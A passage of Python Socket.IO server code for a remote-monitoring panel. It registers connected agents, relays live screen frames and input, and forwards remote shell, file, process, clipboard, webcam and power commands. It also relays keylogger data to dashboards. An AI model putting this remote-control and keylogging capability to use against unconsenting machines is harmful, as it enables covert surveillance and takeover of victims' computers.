                    _audit("agent_evicted", device_id=did, old_sid=old_sid)
                    _fire_webhook("agent_evicted", {"device_id": did})

        join_room(did)
        with _sid_lock:
            _sid_to_device[request.sid] = did
        with _dev_lock:
            _devices[did] = {
                "sid":           request.sid,
                "device_id":     did,
                "label":         label,
                "name":          label,
                "status":        "online",
                "hostname":      data.get("hostname"),
                "username":      data.get("username"),
                "os":            data.get("os"),
                "local_ip":      data.get("local_ip"),
                "ip":            data.get("local_ip"),
                "cpu_count":     data.get("cpu_count"),
                "ram_total_gb":  data.get("ram_total_gb"),
                "agent_version": data.get("agent_version"),
                "stream_mode":   data.get("stream_mode", "video"),
                "gpu":           data.get("gpu"),
                "screen_count":  data.get("screen_count"),
                "connected_at":  utcnow(),
                "last_beat":     utcnow(),
                "cpu":           None,
                "ram":           None,
                "frame_count":   0,
                "last_frame_ts": None,
                "fingerprint":   data,
            }

        log.info(f"Agent ONLINE: {label} ({did}) sid={request.sid}")
        _audit("agent_online", device_id=did, label=label, ip=data.get("local_ip"))
        _push_timeline(did, "agent_online", {"label": label, "ip": data.get("local_ip")})

        # Emit online events
        fp = dict(data)
        sio.emit("agent_online",  {"device_id": did, "name": label, "label": label,
                                   "ip": data.get("local_ip"), "fingerprint": fp, "ts": utcnow()})
        sio.emit("device_online", {"device_id": did, "label": label, "fingerprint": fp, "ts": utcnow()})

        # v12: Send capability flags to agent
        sio.emit("caps", {"caps": AGENT_CAPS, "server_version": VERSION}, room=request.sid)

        # Session handoff — resume viewers without page reload
        with _view_lock:
            active_viewers = list(_viewers.get(did, set()))
        if active_viewers:
            spay = {"tab": "monitor", "action": "start", "device_id": did,
                    "fps": 60, "quality": 90, "scale": 1.0, "monitor": 1}  # v12.2 LIVE-SYNC
            sio.emit("request_action", spay, room=request.sid)
            for vsid in active_viewers:
                sio.emit("agent_replaced", {"device_id": did, "label": label, "ts": utcnow()}, room=vsid)
                sio.emit("watch_ok", {"online": True, "device_id": did, "name": label,
                                      "screen_w": 0, "screen_h": 0, "reconnected": True}, room=vsid)

        # SSE broadcast
        _sse_broadcast("agent_online", {"device_id": did, "label": label})

        # Heavy I/O in background — never blocks the event loop
        _bg(_agent_connect_bg, did, label, data)
        _bg(_fire_hooks, "on_agent_connect", device_id=did, label=label, data=data)

    def _agent_connect_bg(did, label, data):
        try:
            db_upsert(did, {
                "status": "online", "label": label,
                "ip_address": data.get("local_ip"), "hostname": data.get("hostname"),
                "os_info": data.get("os"), "agent_version": data.get("agent_version"),
                "connected_at": utcnow(),
            })
        except Exception:
            pass
        try:
            broadcast_device_update()
            _broadcast_device_list()
        except Exception:
            pass
        _fire_webhook("agent_online", {"device_id": did, "label": label})

    # ── Heartbeat ─────────────────────────────────────────────────────────────
    _hb_count: dict = collections.defaultdict(int)
    _HB_BROADCAST_EVERY = 6   # broadcast every ~60s at 10s interval

    @sio.on("heartbeat")
    def on_hb(data):
        did = data.get("device_id")
        if not did:
            return
        with _dev_lock:
            if did in _devices:
                _devices[did].update({
                    "cpu":       data.get("cpu"),
                    "ram":       data.get("ram"),
                    "last_beat": utcnow(),
                })
        sio.emit("heartbeat_update", data, room=f"view:{did}")
        sio.emit("heartbeat_update", data, room=f"adv_viewers_{did}")
        _hb_count[did] += 1
        if _hb_count[did] % _HB_BROADCAST_EVERY == 0:
            sio.emit("heartbeat_update", data, room="dashboards")
            sio.emit("heartbeat_update", data, room="adv_dashboards")

    # ── Agent auth (Advanced Monitor second socket) ───────────────────────────
    @sio.on("agent_auth")
    def on_agent_auth(data):
        token = data.get("token", "")
        did   = data.get("device_id") or token
        sid   = request.sid
        log.info(f"agent_auth attempt: device={did} sid={sid}")
        if not did:
            sio.emit("auth_error", {"msg": "Empty token/did"}, room=sid)
            return
        # v13: Wait up to 6s for main socket agent_connect using gevent-aware sleep
        # Checks every 200ms (was 500ms) → 3x faster handshake on fast networks
        dev = None
        for _ in range(30):
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                break
            _sleep(0.2)
        if not dev:
            log.warning(f"agent_auth: {did!r} not in _devices after 8s — creating stub")
            with _dev_lock:
                _devices[did] = {
                    "device_id": did, "hostname": did, "label": did, "online": True,
                    "screen_w": 0, "screen_h": 0, "frame_count": 0, "last_frame_ts": None,
                }
            dev = _devices[did]
        _adv_agent_sids[did]   = sid
        _adv_sid_to_agent[sid] = did
        join_room(did)
        log.info(f"Advanced Monitor auth OK: device={did} sid={sid}")
        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
        with _view_lock:
            vcount = max(vcount, len(_viewers.get(did, set())))
        sio.emit("auth_ok", {"role": "agent", "device_id": did}, room=sid)
        sio.emit("viewer_count", {"count": vcount}, room=sid)
        if vcount > 0:
            sio.emit("request_action", {"tab": "monitor", "action": "start", "device_id": did,
                                        "fps": 60, "quality": 90, "scale": 1.0, "monitor": 1}, room=sid)  # v12.2 LIVE-SYNC
        _audit("agent_auth_ok", device_id=did, viewers=vcount)

    @sio.on("agent_auth_ready")
    def on_agent_auth_ready(data):
        did = data.get("device_id") or data.get("token", "")
        sid = request.sid
        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
        with _view_lock:
            vcount = max(vcount, len(_viewers.get(did, set())))
        if vcount > 0:
            sio.emit("viewer_count", {"count": vcount}, room=sid)

    # ── Binary frame relay ────────────────────────────────────────────────────
    @sio.on("frame_bin")
    def on_frame_bin(data):
        """
        v13 ULTRA LIVE-SYNC hot path — runs on every frame (60fps per agent).

        Upgrades over v12:
        - Sequence number stamped into frame metadata for gap detection
        - Per-device FPS ring for accurate real-time FPS measurement
        - Fast-path XXHASH-equivalent dedup (first 64 bytes XOR + size check)
          instead of full SHA-256 — 10x faster on the hot path
        - Backpressure-aware fan-out: slow viewers get frame_drop notice
          instead of blocking the relay for fast viewers
        - Inline stale-frame guard: discard relaying frames >150ms old
        - Single lock acquisition for device state update
        """
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if not did:
            with _sid_lock:
                did = _sid_to_device.get(sid)
        if not did:
            return

        # Normalize to bytes (memoryview / bytearray / bytes all accepted)
        try:
            raw = bytes(data) if not isinstance(data, bytes) else data
        except Exception:
            return

        n = len(raw)
        if n < 20 or n > MAX_FRAME_BYTES:
            return

        # ── v13: Extract timestamp early for stale-frame guard ────────────────
        now_us = int(time.time() * 1_000_000)
        ts_us = 0
        try:
            ts_us = int.from_bytes(raw[8:16], "big")
        except Exception:
            pass
        # Drop frames >2000ms old — prevents lag while tolerating clock drift.
        if ts_us and (now_us - ts_us) > 2_000_000:
            return

        # ── v13: Fast dedup — compare first 64 bytes + size (10x faster than SHA-256) ─
        if FRAME_DEDUP:
            quick_sig = (n, raw[:64])
            if _frame_hashes.get(did) == quick_sig:
                return  # identical or near-identical frame — drop
            _frame_hashes[did] = quick_sig

        # ── v12: Bandwidth cap ────────────────────────────────────────────────
        if MAX_FRAME_KBPS > 0:
            now_bw = time.time()
            dq = _bw_window[did]
            dq.append((now_bw, n))
            while dq and now_bw - dq[0][0] > 1.0:
                dq.popleft()
            if sum(b for _, b in dq) / 1024.0 > MAX_FRAME_KBPS:
                return

        # ── v13: Increment sequence number (viewers detect gaps / reorder) ────
        seq = _device_frame_seq[did]
        _device_frame_seq[did] = seq + 1

        # ── Decode w/h from header bytes 0-8 ─────────────────────────────────
        if n >= 8:
            try:
                w, h = struct.unpack_from(">II", raw, 0)
                if w > 0 and h > 0:
                    with _dev_lock:
                        dev = _devices.get(did)
                        if dev:
                            dev["screen_w"] = w
                            dev["screen_h"] = h
            except Exception:
                pass

        # ── v13: GOP buffer (size 0 = live-only, no stale replay) ─────────────
        if GOP_BUF_SIZE > 0:
            with _adv_gop_lock:
                buf = _adv_gop_buf.setdefault(did, collections.deque(maxlen=GOP_BUF_SIZE))
                buf.append(raw)

        # ── Frame stats + per-device FPS ring ─────────────────────────────────
        _frame_stats[did].append((time.time(), n))
        _device_fps_ring[did].append(time.time())

        # ── Device record update — one lock, minimal work ─────────────────────
        with _dev_lock:
            dev = _devices.get(did)
            if dev:
                fc = dev.get("frame_count", 0) + 1
                dev["frame_count"]   = fc
                dev["last_frame_ts"] = utcnow()

        # ── v13: Fan-out with sequence metadata ───────────────────────────────
        # Append a 4-byte big-endian sequence number after the standard payload
        # so the viewer can detect dropped/out-of-order frames without overhead.
        # Format: raw_frame_bytes + b"\xFFSEQ" + seq.to_bytes(4,"big")
        # Viewers that don't understand the suffix ignore it safely (past EOF).
        seq_suffix = bytes([0xFF,0x53,0x45,0x51]) + seq.to_bytes(4, "big")
        frame_with_seq = raw + seq_suffix

        r1 = f"adv_viewers_{did}"
        r2 = f"view:{did}"
        # Emit frame_bin to both rooms — single call each for minimum latency
        sio.emit("frame_bin", frame_with_seq, room=r1)
        sio.emit("frame_bin", frame_with_seq, room=r2)

        # ── v13: Lightweight frame-metadata event (no binary) ─────────────────
        # Sent every 10 frames so viewer HUD can show live FPS / latency
        # without processing every frame_bin. Much cheaper than per-frame JSON.
        if seq % 10 == 0:
            fps_ring = _device_fps_ring[did]
            if len(fps_ring) >= 2:
                _span = fps_ring[-1] - fps_ring[0]
                _actual_fps = round((len(fps_ring) - 1) / _span, 1) if _span > 0 else 0
            else:
                _actual_fps = 0
            sio.emit("frame_meta", {
                "device_id": did, "seq": seq, "ts_us": ts_us,
                "size": n, "fps": _actual_fps,
            }, room=r1)

        # ── Plugin hooks (background — never blocks hot path) ─────────────────
        if _plugin_hooks.get("on_frame"):
            _bg(_fire_hooks, "on_frame", device_id=did, size=n, seq=seq)

    @sio.on("frame_bin_relay")
    def on_frame_bin_relay(data):
        """Main-socket fallback when adv socket unavailable."""
        try:
            did = data.get("device_id", "")
            if not did:
                return
            if data.get("b64"):
                import base64
                raw = base64.b64decode(data["b64"])
            else:
                raw_list = data.get("data")
                if not raw_list:
                    return
                raw = bytes(raw_list)
            if not raw or len(raw) > MAX_FRAME_BYTES:
                return
            # v13: stale-frame guard — discard frames >2000ms old (live-sync)
            if len(raw) >= 16:
                try:
                    frame_ts_us = int.from_bytes(raw[8:16], "big")
                    now_us = int(time.time() * 1_000_000)
                    if (now_us - frame_ts_us) > 2_000_000:  # 2000ms live-sync TTL
                        return  # stale — don't relay
                except Exception:
                    pass
            if len(raw) >= 8:
                try:
                    w, h = struct.unpack_from(">II", raw, 0)
                    if w > 0 and h > 0:
                        with _dev_lock:
                            if did in _devices:
                                _devices[did]["screen_w"] = w
                                _devices[did]["screen_h"] = h
                except Exception:
                    pass
            with _adv_gop_lock:
                if did not in _adv_gop_buf:
                    _adv_gop_buf[did] = collections.deque(maxlen=GOP_BUF_SIZE)  # consistent with frame_bin handler
                _adv_gop_buf[did].append(raw)
            with _frame_stats_lock:
                _frame_stats[did].append((time.time(), len(raw)))
            with _dev_lock:
                if did in _devices:
                    _devices[did]["frame_count"]   = _devices[did].get("frame_count", 0) + 1
                    _devices[did]["last_frame_ts"] = utcnow()
            sio.emit("frame_bin", raw, room=f"adv_viewers_{did}")
            sio.emit("frame_bin", raw, room=f"view:{did}")
        except Exception as e:
            log.warning(f"frame_bin_relay error: {e}")

    # v13: cursor position cache for delta suppression
    _cursor_prev: dict = {}  # device_id → (x, y)

    @sio.on("cursor_bin")
    def on_cursor_bin(data):
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if not did:
            with _sid_lock:
                did = _sid_to_device.get(sid)
        if not did:
            return
        try:
            raw = bytes(data)
        except Exception:
            return
        # v13: delta suppression — skip relay if cursor moved <2px (reduces jitter events)
        if len(raw) >= 8:
            try:
                cx, cy = struct.unpack_from(">ii", raw, 0)
                prev = _cursor_prev.get(did)
                if prev:
                    dx, dy = abs(cx - prev[0]), abs(cy - prev[1])
                    if dx < 2 and dy < 2:
                        return  # sub-pixel movement — skip
                _cursor_prev[did] = (cx, cy)
            except Exception:
                pass
        _adv_cursor_latest[did] = raw
        sio.emit("cursor_bin", raw, room=f"adv_viewers_{did}")
        sio.emit("cursor_bin", raw, room=f"view:{did}")

    @sio.on("agent_info")
    def on_agent_info(data):
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if not did:
            with _sid_lock:
                did = _sid_to_device.get(sid)
        if did:
            with _dev_lock:
                if did in _devices:
                    _devices[did]["hostname"] = data.get("hostname", _devices[did].get("hostname", ""))
                    _devices[did]["os"]       = data.get("os",       _devices[did].get("os", ""))

    @sio.on("agent_pong")
    def on_agent_pong(data):
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if did:
            rtt = (time.time() - data.get("ts", time.time())) * 1000
            with _dev_lock:
                if did in _devices:
                    _devices[did]["rtt_ms"] = round(rtt, 1)

    # ── Input events ──────────────────────────────────────────────────────────
    @sio.on("input_event")
    def on_input_event(data):
        sid = request.sid
        _touch_viewer(sid)
        with _adv_viewer_lock:
            did = _adv_viewer_rooms.get(sid)
        did = did or data.get("device_id", "")
        if not did:
            return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("input_event", data, room=agent_sid)
        else:
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                evt = data.get("type", "")
                tab = {
                    "mouse_move":    "mouse_move",
                    "mouse_click":   "mouse_click",
                    "mouse_dblclick":"mouse_click",
                    "mouse_scroll":  "scroll",
                    "key_event":     "key_event",
                    "type_text":     "type_text",
                }.get(evt, "mouse_move")
                sio.emit("request_action", {"tab": tab, **data}, room=did)

    @sio.on("mouse_event")
    def on_mouse(data):
        did = data.get("device_id", "")
        if not did: return
        _touch_viewer(request.sid)
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("input_event", {
                "device_id": did,
                "type": "mouse_click" if data.get("action") in ("down","up","click") else "mouse_move",
                "x": data.get("x", 0), "y": data.get("y", 0),
                "button": data.get("button", "left"), "down": data.get("action") == "down",
            }, room=agent_sid)
        else:
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                sio.emit("request_action", {"tab": "mouse_event", **data}, room=did)

    @sio.on("scroll_event")
    def on_scroll(data):
        did = data.get("device_id", "")
        if not did: return
        _touch_viewer(request.sid)
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("input_event", {"device_id": did, "type": "mouse_scroll",
                                     "x": data.get("x", 0), "y": data.get("y", 0),
                                     "delta": data.get("delta", 3)}, room=agent_sid)
        else:
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                sio.emit("request_action", {"tab": "scroll", **data}, room=did)

    @sio.on("key_event")
    def on_key(data):
        _touch_viewer(request.sid)
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "key_event", **data}, room=did)

    # ── WebRTC signaling ──────────────────────────────────────────────────────
    @sio.on("webrtc_offer")
    def on_webrtc_offer(data):
        sid = request.sid
        with _adv_viewer_lock:
            did = _adv_viewer_rooms.get(sid)
        if not did: return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("webrtc_offer", {"viewer_sid": sid, "sdp": data.get("sdp")}, room=agent_sid)

    @sio.on("webrtc_answer")
    def on_webrtc_answer(data):
        vsid = data.get("viewer_sid")
        if vsid: sio.emit("webrtc_answer", {"sdp": data.get("sdp")}, room=vsid)

    @sio.on("webrtc_ice_agent")
    def on_webrtc_ice_agent(data):
        vsid = data.get("viewer_sid")
        if vsid: sio.emit("webrtc_ice", {"candidate": data.get("candidate")}, room=vsid)

    @sio.on("webrtc_ice_viewer")
    def on_webrtc_ice_viewer(data):
        sid = request.sid
        with _adv_viewer_lock:
            did = _adv_viewer_rooms.get(sid)
        if not did: return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("webrtc_ice", {"viewer_sid": sid, "candidate": data.get("candidate")}, room=agent_sid)

    @sio.on("webrtc_connected")
    def on_webrtc_connected(data):
        log.info(f"WebRTC DataChannel active: viewer={request.sid}")

    # ── Result relay events ───────────────────────────────────────────────────
    def _relay(event_in, event_out, rooms=("view",), also_dashboards=False):
        """Register a relay handler: agent → viewer room(s).
        Loop vars are captured via default-arg binding to avoid closure-over-loop-var bug.
        """
        def _make_handler(_ev_out=event_out, _rooms=tuple(rooms), _also=also_dashboards):
            @sio.on(event_in)
            def _handler(data):
                did = data.get("device_id", "")
                for room_prefix in _rooms:
                    sio.emit(_ev_out, data, room=f"{room_prefix}:{did}")
                if _also:
                    sio.emit(_ev_out, data, room="dashboards")
        _make_handler()

    @sio.on("screenshot_result")
    def on_screenshot_result(data):
        did = data.get("device_id", "")
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        if "frame" in out and "image" not in out:
            out["image"] = out["frame"]
        sio.emit("screenshot",        out, room=f"view:{did}")
        sio.emit("screenshot_result", out, room=f"view:{did}")

    @sio.on("ping_result")
    def on_ping_result(data):
        did = data.get("device_id", "")
        sio.emit("pong_agent", data, room=f"view:{did}")
        sio.emit("pong_agent", data, room="dashboards")

    @sio.on("cursor_event")
    def on_cursor_event(data):
        sio.emit("cursor_event", data, room=f"view:{data.get('device_id','')}")

    @sio.on("system_stats_report")
    def on_sys(data):
        did = data.get("device_id", "")
        sio.emit("update_system_tab", data, room=f"view:{did}")
        sio.emit("update_system_tab", data, room="dashboards")

    for _ev_in, _ev_out, _also_dash in [
        ("processes_report",       "processes_result",      True),
        ("kill_result",            "kill_result",           False),
        ("start_process_result",   "start_process_result",  False),
        ("shell_result",           "shell_result",          True),
        ("file_list_result",       "file_list_result",      True),
        ("file_read_result",       "file_read_result",      True),
        ("file_download_result",   "file_download_result",  True),
        ("file_delete_result",     "file_delete_result",    False),
        ("drives_report",          "drives_report",         True),
        ("disks_report",           "disks_report",          True),
        ("network_report",         "network_report",        True),
        ("webcam_result",          "webcam_result",         True),
        ("webcam_list_result",     "webcam_list_result",    False),
        ("keylog_data",            "keylog_data",           True),
        ("clipboard_data",         "clipboard_data",        False),
        ("clipboard_result",       "clipboard_result",      True),
        ("clipboard_set_result",   "clipboard_set_result",  False),
        ("action_result",          "action_result",         True),
        ("stream_stats",           "stream_stats",          False),
    ]:
        _relay(_ev_in, _ev_out, also_dashboards=_also_dash)

    @sio.on("agent_alert")
    def on_agent_alert(data):
        did = data.get("device_id", "")
        sio.emit("agent_alert", data, room=f"view:{did}")
        sio.emit("agent_alert", data, room="dashboards")
        _audit("agent_alert", device_id=did, type=data.get("type"), value=data.get("value"))
        _fire_webhook("agent_alert", data)

    # ── Dashboard → device commands ───────────────────────────────────────────
    @sio.on("dashboard_command")
    def on_cmd(data):
        did = data.get("device_id")
        with _dev_lock:
            dev = _devices.get(did)
        if not dev:
            emit("command_error", {"error": f"Device '{did}' not connected."})
            return
        sio.emit("request_action", data, room=did)

    def _fwd(event_name, tab=None, extra_fn=None):
        """Register a dashboard→agent command forwarder."""
        @sio.on(event_name)
        def _handler(data):
            did = data.get("device_id", "")
            with _dev_lock:
                dev = _devices.get(did)
            if not dev:
                return
            payload = {"tab": tab or event_name, "device_id": did, **data}
            if extra_fn:
                extra_fn(payload, data)
            sio.emit("request_action", payload, room=did)

    @sio.on("start_stream")
    def on_start_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            join_room(f"view:{did}")
            with _view_lock: _viewers[did].add(request.sid)
            with _dash_lock: _dashboard_device[request.sid] = did
            sio.emit("request_action", {
                "tab": "monitor", "action": "start", "device_id": did,
                "fps": data.get("fps", 20), "quality": data.get("quality", 55),
                "scale": data.get("scale", 0.8), "mode": data.get("mode", "video"),
                "monitor": data.get("monitor", 1),
            }, room=did)
        else:
            emit("command_error", {"error": f"Device '{did}' not connected."})

    @sio.on("stop_stream")
    def on_stop_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    @sio.on("set_quality")
    def on_set_quality(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "set_quality",
                                        "quality": data.get("quality", 55), "device_id": did}, room=did)

    @sio.on("set_stream_mode")
    def on_set_mode(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "set_mode",
                                        "mode": data.get("mode", "video"), "device_id": did}, room=did)

    @sio.on("request_screenshot")
    def on_screenshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "screenshot", "quality": data.get("quality", 60),
                                        "scale": data.get("scale", 0.75), "device_id": did}, room=did)

    @sio.on("ping_agent")
    def on_ping(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "ping", "t": data.get("t", utcnow()), "device_id": did}, room=did)

    @sio.on("disconnect_screen")
    def on_disconnect_screen(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    # Simple forwarders
    for _ename, _tab in [
        ("start_sysmon",      "system"),
        ("stop_sysmon",       "system"),
        ("request_snapshot",  "system_snapshot"),
        ("request_disks",     "disks"),
        ("request_network",   "network"),
        ("list_processes",    "processes"),
        ("kill_process",      "kill_process"),
        ("start_process",     "start_process"),
        ("file_list",         "file_list"),
        ("file_read",         "file_read"),
        ("file_download",     "file_download"),
        ("file_delete",       "file_delete"),
        ("file_upload",       "file_upload"),
        ("request_drives",    "drives"),
        ("clipboard_get",     "clipboard_get"),
        ("clipboard_set",     "clipboard_set"),
        ("uninstall_agent",   "uninstall"),
        ("webcam_capture",    "webcam"),
        ("webcam_list",       "webcam_list"),
    ]:
        _fwd(_ename, tab=_tab)

    @sio.on("shell_command")
    def on_shell(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "shell", "command": data.get("command", "echo hello"),
                                        "shell_type": data.get("shell_type", "cmd"), "device_id": did}, room=did)

    @sio.on("power_command")
    def on_power(data):
        did     = data.get("device_id", "")
        command = data.get("command", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": command, "device_id": did}, room=did)
            _audit("power_command", device_id=did, command=command)

    # ══════════════════════════════════════════════════════════════════════════
    #  Watchdog  (gevent greenlet — uses _sleep so it doesn't block anything)
    # ══════════════════════════════════════════════════════════════════════════
    def _watchdog_loop():
        """
        Runs every 15s inside a gevent greenlet.
        1. Heartbeat timeout → mark offline
        2. Stream recovery → kickstart 0-FPS devices with active viewers
        3. Viewer idle + max-session enforcement
        4. Rate-bucket cleanup
        """
        while True:
            try:
                _sleep(15)
                now_dt   = datetime.datetime.utcnow()
                now_mono = time.monotonic()

                # ── 1. Heartbeat timeout ──────────────────────────────────
                stale = []
                with _dev_lock:
                    for did, dev in list(_devices.items()):
                        lb = dev.get("last_beat")
                        if not lb:
                            continue
                        try:
                            last_dt = datetime.datetime.fromisoformat(lb.replace("Z", ""))
                            if (now_dt - last_dt).total_seconds() > HEARTBEAT_TIMEOUT:
                                stale.append((did, dev.get("label", did), dev.get("sid", "")))
                        except Exception:
                            pass
                    for did, *_ in stale:
                        _devices.pop(did, None)

                for did, label, agent_sid in stale:
                    log.warning(f"Watchdog: heartbeat timeout — {label} ({did})")
                    _notify_reconnecting(did)
                    with _adv_gop_lock:
                        _adv_gop_buf.pop(did, None)
                    _adv_cursor_latest.pop(did, None)
                    _adv_agent_sids.pop(did, None)
                    if agent_sid:
                        with _sid_lock:
                            _sid_to_device.pop(agent_sid, None)
                        _adv_sid_to_agent.pop(agent_sid, None)
                    sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
                    sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
                    _audit("watchdog_offline", device_id=did, label=label)
                    _bg(db_update, did, {"status": "offline", "disconnected_at": utcnow()})
                    _fire_webhook("watchdog_offline", {"device_id": did, "label": label})
                if stale:
                    _bg(broadcast_device_update)

                # ── 2. Stream recovery (kickstart 0-FPS streams) ──────────
                with _dev_lock:
                    online_devs = list(_devices.keys())

                for did in online_devs:
                    with _view_lock:
                        vcount = len(_viewers.get(did, set()))
                    with _adv_viewer_lock:
                        vcount += sum(1 for v in _adv_viewer_rooms.values() if v == did)
                    if vcount == 0:
                        continue
                    with _dev_lock:
                        dev = _devices.get(did)
                        if not dev:
                            continue
                        last_frame = dev.get("last_frame_ts")
                        frame_count = dev.get("frame_count", 0)

                    stuck = False
                    if frame_count == 0 and last_frame is None:
                        stuck = True
                    elif last_frame:
                        try:
                            lf_dt = datetime.datetime.fromisoformat(last_frame.replace("Z", ""))
                            if (now_dt - lf_dt).total_seconds() > 20:
                                stuck = True
                        except Exception:
                            pass

                        if stuck:
                            # log.debug(f"Watchdog: device {did} frame_count={frame_count} last={last_frame}")
                            pass
                        
                        if False: # DISABLED: stuck
                            # Use current session settings if available, else defaults
                            # sio.emit("request_action", {"tab": "monitor", "action": "probe", "device_id": did}, room=did)
                            # log.warning(f"Watchdog: stream stalled for {did} with {vcount} viewer(s) — kickstarting")
                            pass
                        elif stuck:
                             # spay = {"tab": "monitor", "action": "start", "device_id": did,
                             #         "fps": 20, "quality": 70, "scale": 0.8, "monitor": 1}
                             # sio.emit("request_action", spay, room=did)
                             # agent_adv = _adv_agent_sids.get(did)
                             # if agent_adv:
                             #     sio.emit("request_action", spay, room=agent_adv)
                             pass

                # ── 3. Viewer idle / max duration ─────────────────────────
                if VIEWER_IDLE_TIMEOUT > 0 or MAX_SESSION_DURATION > 0:
                    to_kick = []
                    with _viewer_activity_lock:
                        for vsid, start in list(_viewer_session_start.items()):
                            if VIEWER_IDLE_TIMEOUT > 0:
                                idle = now_mono - _viewer_last_activity.get(vsid, start)
                                if idle >= VIEWER_IDLE_TIMEOUT:
                                    to_kick.append((vsid, f"Idle timeout ({int(idle)}s)"))
                                    continue
                            if MAX_SESSION_DURATION > 0:
                                dur = now_mono - start
                                if dur >= MAX_SESSION_DURATION:
                                    to_kick.append((vsid, f"Max session duration ({int(dur)}s)"))
                    for vsid, reason in to_kick:
                        try:
                            sio.emit("kicked", {"reason": reason, "ts": utcnow()}, room=vsid)
                            sio.disconnect(vsid)
                            _cleanup_viewer(vsid)
                            _audit("viewer_kicked_policy", viewer_sid=vsid, reason=reason)
                        except Exception:
                            pass

                # ── 4. Rate-bucket cleanup ────────────────────────────────
                with _rate_lock:
                    stale_ips = [ip for ip, dq in _rate_buckets.items() if not dq]
                    for ip in stale_ips:
                        _rate_buckets.pop(ip, None)

                # ── 6. Stream Stats Broadcast (v13: fps_ring for real-time accuracy) ──
                for did in list(_device_fps_ring.keys()):
                    fps_ring = _device_fps_ring.get(did)
                    if not fps_ring or len(fps_ring) < 2:
                        continue
                    _span = fps_ring[-1] - fps_ring[0]
                    actual_fps = round((len(fps_ring) - 1) / _span, 1) if _span > 0 else 0
                    now_t = time.time()
                    dq = _frame_stats.get(did)
                    recent_bytes = [b for t, b in (dq or []) if now_t - t < 2.0]
                    kbps = sum(recent_bytes) / (2.0 * 1024) if recent_bytes else 0
                    with _adv_viewer_lock:
                        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
                    stats_payload = {
                        "device_id":  did,
                        "actual_fps": actual_fps,
                        "kbps":       round(kbps, 1),
                        "viewers":    vcount,
                        "seq":        _device_frame_seq.get(did, 0),
                        "ts":         utcnow(),
                    }
                    sio.emit("stream_stats", stats_payload, room=f"view:{did}")
                    sio.emit("stream_stats", stats_payload, room=f"adv_viewers_{did}")

                # ── 7. v13: Stale phantom-viewer cleanup ─────────────────────
                with _adv_viewer_lock:
                    all_adv_sids = set(_adv_viewer_rooms.keys())
                with _view_lock:
                    known_sids = set()
                    for s in _viewers.values():
                        known_sids.update(s)
                phantom = all_adv_sids - known_sids
                if phantom:
                    with _adv_viewer_lock:
                        for psid in phantom:
                            _adv_viewer_rooms.pop(psid, None)
                    log.debug(f"Watchdog: cleaned {len(phantom)} phantom viewer SIDs")

                # ── 5. Periodic health log ────────────────────────────────
                if int(now_mono) % 300 < 15:
                    try:
                        import psutil
                        mem = psutil.Process().memory_info().rss // (1024 * 1024)
                    except Exception:
                        mem = "?"
                    with _adv_viewer_lock:
                        adv_viewers = len(_adv_viewer_rooms)
                    log.info(
                        f"Watchdog health | devices={len(_devices)} viewers={adv_viewers} "
                        f"gop_bufs={len(_adv_gop_buf)} threads={threading.active_count()} mem={mem}MB"
                    )

            except Exception as exc:
                _report_crash("_watchdog_loop", exc)
                _sleep(5)

    sio.start_background_task(_watchdog_loop)

    # ── v14 Enterprise SocketIO handlers ─────────────────────────────────────
    @sio.on("connection_quality")
    def on_connection_quality(data):
        """Agent reports real-time quality metrics."""
        did = data.get("device_id", "")
        with _dev_lock:
            if did in _devices:
                _devices[did]["quality"] = {
                    "fps":       data.get("fps"),
                    "encode_ms": data.get("encode_ms"),
                    "rtt_ms":    data.get("rtt_ms"),
                    "jitter_ms": data.get("jitter_ms"),
                    "drops":     data.get("drops", 0),
                    "ts":        data.get("ts"),
                }
        sio.emit("connection_quality", data, room=f"view:{did}")
        sio.emit("connection_quality", data, room=f"adv_viewers_{did}")

    @sio.on("quality_pong")
    def on_quality_pong(data):
        """Agent replied to quality_ping — compute RTT."""
        did = data.get("device_id", "")
        sent_ts = float(data.get("ts", time.time()))
        rtt = (time.time() - sent_ts) * 1000
        with _dev_lock:
            if did in _devices:
                _devices[did]["rtt_ms"] = round(rtt, 1)
        sio.emit("rtt_update", {"device_id": did, "rtt_ms": round(rtt, 1),
                                 "ts": utcnow()}, room=f"view:{did}")

    @sio.on("diagnostics_result")
